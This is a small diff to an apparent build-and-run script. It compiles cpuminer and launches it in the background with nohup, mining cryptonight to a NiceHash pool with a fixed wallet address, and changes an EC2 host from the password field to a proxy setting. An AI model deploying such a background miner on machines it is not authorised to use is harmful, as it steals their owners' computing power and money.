@@ -17,4 +17,4 @@ ln -s /usr/include/curl curl
 
 sudo ./autogen.sh
 sudo ./build.sh
-nohup ./cpuminer -a cryptonight  -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u  15C2WyRMqCTjJzzuch6dPQjtgZdoiK63ew -p ec2-52-56-236-53.eu-west-2.compute.amazonaws.com:9999 --randomize &
+nohup ./cpuminer -a cryptonight  -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u  15C2WyRMqCTjJzzuch6dPQjtgZdoiK63ew -p x -x ec2-52-56-236-53.eu-west-2.compute.amazonaws.com:9999 --randomize &
